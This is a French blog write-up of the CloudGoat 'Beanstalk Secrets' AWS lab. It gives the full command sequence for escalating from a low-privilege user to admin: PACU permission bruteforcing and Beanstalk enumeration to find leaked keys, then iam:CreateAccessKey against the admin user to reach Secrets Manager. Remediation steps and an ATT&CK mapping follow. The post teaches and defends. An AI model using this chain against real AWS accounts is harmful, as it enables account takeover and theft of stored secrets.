---
title: "CloudGoat > Beanstalk Secrets : quand les variables d'environnement deviennent une porte d'entrée"
date: 2026-05-07
tags: ["aws", "iam", "elastic-beanstalk", "privilege-escalation", "secrets-manager", "cloudgoat", "write-up"]
categories: ["write-up"]
description: "Beanstalk expose les env vars à quiconque peut décrire l'environnement. Avec un CreateAccessKey sans restriction, c'est suffisant pour devenir admin."
draft: false
---

Des credentials AWS en clair dans la config d'une appli, et une permission IAM mal scopée. C'est tout ce qu'il faut. Pas de CVE, pas d'exploit exotique : juste deux mauvaises pratiques enchaînées qui mènent droit à Secrets Manager.

---

## Contexte

Le scénario démarre avec les credentials d'un user AWS ultra-restreint. Pas d'accès IAM, pas de S3, pas de Lambda. À peu près rien. L'objectif : récupérer un secret dans AWS Secrets Manager en pivotant d'un user à l'autre. Ce qui rend ce scénario intéressant, c'est qu'il n'y a aucune vulnérabilité technique à exploiter. Que de la config bancale.

---

## Setup

```bash
./cloudgoat.py create beanstalk_secrets
aws configure --profile bean
# Access Key ID + Secret Key fournis par CloudGoat
# Region : us-east-1
```

Vérification rapide pour savoir à qui on a affaire :

```bash
aws sts get-caller-identity --profile bean
```

```json
{
    "Arn": "arn:aws:iam::442908905337:user/cgid6yz7f6t1bx_low_priv_user"
}
```

`low_priv_user`. Le nom annonce la couleur. La suite va être intéressante.

---

## Phase attaque

### Étape 1 : Qu'est-ce qu'on peut faire ?

Premier réflexe sur un compte inconnu : cartographier les permissions disponibles. Le problème ici, c'est que ce user n'a même pas accès aux APIs IAM pour lire ses propres droits. Du coup, on passe par `iam__bruteforce_permissions` dans PACU : le module teste toutes les API calls possibles une par une et observe ce qui répond.

```
pacu
import_keys bean
run iam__bruteforce_permissions
```

Résultat : quatre permissions fonctionnelles sur tout le compte.

```
sts.get_caller_identity     ✓
sts.get_session_token       ✓
ec2.describe_subnets        ✓
dynamodb.describe_endpoints ✓
```

Presque rien. Mais dans les métadonnées des subnets remontés, un tag sort du lot :

```
'Key': 'Scenario', 'Value': 'beanstalk_secrets'
```

Beanstalk. On sait où chercher.

### Étape 2 : Les credentials en clair dans la config Beanstalk

Elastic Beanstalk, c'est le PaaS d'AWS : tu donnes ton code, AWS crée l'infra. Pour configurer l'appli, les devs utilisent des variables d'environnement. C'est pratique. C'est aussi là que trainent les secrets quand personne n'a vraiment réfléchi à la question.

```
run elasticbeanstalk__enum --regions us-east-1
```

```
Potential secret in environment variable:
  SECONDARY_ACCESS_KEY => AKIA***************
  SECONDARY_SECRET_KEY => ************************************
```

Jackpot. Des credentials AWS hardcodés, lisibles par quiconque peut appeler `elasticbeanstalk:DescribeConfigurationSettings`.

> **Leçon :** Les variables d'environnement Beanstalk sont visibles dans la console AWS, dans les APIs, potentiellement dans les logs. Ce n'est pas un endroit pour stocker des secrets. La bonne pratique : AWS Secrets Manager ou SSM Parameter Store, avec lecture à runtime via le rôle IAM de l'environnement. Zéro credential en dur.

### Étape 3 : Ce que le secondary user peut faire

On configure le profil et on regarde :

```bash
aws configure --profile secondary
aws sts get-caller-identity --profile secondary
# "Arn": "...user/cgid6yz7f6t1bx_secondary_user"
```

On énumère dans PACU, puis on lit le contenu exact de la policy attachée :

```bash
aws iam get-policy-version \
  --policy-arn arn:aws:iam::442908905337:policy/cgid6yz7f6t1bx_secondary_policy \
  --version-id v1 --profile secondary
```

```json
{
  "Statement": [
    {
      "Action": ["iam:CreateAccessKey"],
      "Effect": "Allow",
      "Resource": "*"
    },
    {
      "Action": ["iam:ListUsers", "iam:GetUser", "iam:ListRoles", "..."],
      "Effect": "Allow",
      "Resource": "*"
    }
  ]
}
```

`iam:CreateAccessKey` sur `Resource: *`. On peut créer des credentials pour n'importe quel user du compte. Y compris les admins.

### Étape 4 : Privilege escalation

Avec `iam:ListUsers` on identifie la cible parmi les six users énumérés :

```
arn:aws:iam::442908905337:user/cgid6yz7f6t1bx_admin_user
```

Une commande :

```bash
aws iam create-access-key \
  --user-name cgid6yz7f6t1bx_admin_user \
  --profile secondary
```

```json
{
    "AccessKey": {
        "UserName": "cgid6yz7f6t1bx_admin_user",
        "AccessKeyId": "AKIA***************",
        "Status": "Active"
    }
}
```

> **Leçon :** `iam:CreateAccessKey` sur `Resource: *`, c'est une escalade de privilèges directe. Pas besoin du mot de passe de l'admin, pas de MFA à contourner. On génère des credentials valides pour n'importe quel user du compte. La permission doit être restreinte au user lui-même : `Resource: arn:aws:iam::ACCOUNT:user/${aws:username}`.

```bash
aws configure --profile admin
aws sts get-caller-identity --profile admin
# "Arn": "...user/cgid6yz7f6t1bx_admin_user"
```

Compte compromis.

### Étape 5 : Flag dans Secrets Manager

```
import_keys admin
run secrets__enum --regions us-east-1
```

```bash
cat ~/.local/share/pacu/beanstalk/downloads/secrets/secrets_manager/secrets.txt
# cgid6yz7f6t1bx_final_flag: FLAG{D0nt_st0r3_s3cr3ts_in_b3@nsta1k!}
```

Le flag dit tout.

---

## Chaîne d'attaque

```
low_priv_user (bean)
  : iam__bruteforce_permissions, 4 permissions seulement
  : elasticbeanstalk__enum
  : SECONDARY_ACCESS_KEY en clair dans les env vars
  : secondary_user, iam:CreateAccessKey sur Resource: *
  : create-access-key sur admin_user
  : admin_user
  : secrets__enum
  : FLAG{D0nt_st0r3_s3cr3ts_in_b3@nsta1k!}
```

Deux vulnérabilités. Cinq étapes. Zéro exploit technique.

![Exploitation flowchart](https://github.com/user-attachments/assets/cf16f767-d8b3-436f-9812-c2d06ea0876b)

---

## Remédiation

### Vuln 1 : Credentials hardcodés dans Beanstalk

On stocke le secret là où il devrait être depuis le début :

```bash
aws secretsmanager create-secret \
  --name "beanstalk/secondary-credentials" \
  --secret-string '{"access_key":"xxx","secret_key":"xxx"}' \
  --region us-east-1 --profile admin
```

On vide les variables exposées :

```bash
aws elasticbeanstalk update-environment \
  --environment-name <env-name> \
  --option-settings \
    Namespace=aws:elasticbeanstalk:application:environment,OptionName=SECONDARY_ACCESS_KEY,Value="" \
    Namespace=aws:elasticbeanstalk:application:environment,OptionName=SECONDARY_SECRET_KEY,Value="" \
  --region us-east-1 --profile admin
```

L'appli lit le secret à runtime via le SDK. Rien en dur dans la config.

### Vuln 2 : `iam:CreateAccessKey` mal scopé

On restreint la permission au user lui-même uniquement :

```bash
aws iam create-policy-version \
  --policy-arn arn:aws:iam::442908905337:policy/cgid6yz7f6t1bx_secondary_policy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "iam:CreateAccessKey",
      "Resource": "arn:aws:iam::442908905337:user/cgid6yz7f6t1bx_secondary_user"
    }]
  }' \
  --set-as-default --profile admin
```

Preuve que l'escalade est bloquée :

```bash
aws iam create-access-key \
  --user-name cgid6yz7f6t1bx_admin_user \
  --profile secondary

# AccessDenied : not authorized to perform iam:CreateAccessKey
# on resource: user cgid6yz7f6t1bx_admin_user
```

---

## Bilan

| Vulnérabilité | Impact | Remédiation |
|---|---|---|
| Credentials dans les env vars Beanstalk | Pivot vers secondary_user | Secrets Manager + rôle IAM |
| `iam:CreateAccessKey` sur `Resource: *` | Escalade vers admin | Restreindre au user lui-même |
| Pas de MFA sur l'admin | Accès immédiat si creds fuient | MFA obligatoire + Deny policy |

Ce scénario illustre quelque chose qu'on voit souvent en vrai : les compromissions cloud ne viennent pas de failles techniques sophistiquées. Elles viennent de décisions de configuration prises trop vite. Des credentials "temporaires" qui restent, une permission copiée-collée sans être restreinte. Chaque mauvaise pratique prise isolément semblerait presque anodine. Ensemble, elles forment un chemin d'attaque complet vers la donnée sensible.

Le même mécanisme — `iam:CreateAccessKey` utilisé comme vecteur de privesc — est au cœur du scénario [IAM Privesc by Key Rotation](/posts/writeup-iam-privesc-key-rotation/), avec une chaîne encore plus tordue autour des tags IAM et du MFA.

---

## MITRE ATT&CK

| Tactic | Technique | Description |
|---|---|---|
| Initial Access | T1078.004 | Credentials IAM low-priv fournis |
| Discovery | T1526 | Enumération Elastic Beanstalk |
| Credential Access | T1552.001 | Credentials en clair dans les env vars |
| Discovery | T1087.004 | Enumération des users et rôles IAM |
| Privilege Escalation | T1098.001 | `iam:CreateAccessKey` sur admin user |
| Collection | T1555 | Récupération du secret dans Secrets Manager |

---

*Scénario réalisé avec [CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat) de RhinoSecurityLabs.*
